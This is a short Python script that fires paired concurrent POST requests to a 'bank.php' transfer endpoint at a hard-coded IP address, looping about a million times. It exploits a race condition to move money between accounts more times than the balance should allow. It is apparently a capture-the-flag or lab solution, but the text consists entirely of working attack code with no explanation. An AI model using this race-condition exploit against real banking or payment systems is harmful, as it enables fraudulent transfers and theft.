import time
import requests
import threading

headers = {'Content-Type': 'application/x-www-form-urlencoded'}
for i in range(0xfffff):
    time.sleep(0.1)

    def AtoB(cantidad):
        r = requests.post( 'http://18.188.42.158/bank.php?id=b188193ac995dc526ad52fb835b3357c', 
                           headers=headers, 
                           data={'transfer':cantidad,'account':'Transfer to B'})

    threading.Thread(target=AtoB, args=(200, )).start()
    threading.Thread(target=AtoB, args=(200, )).start()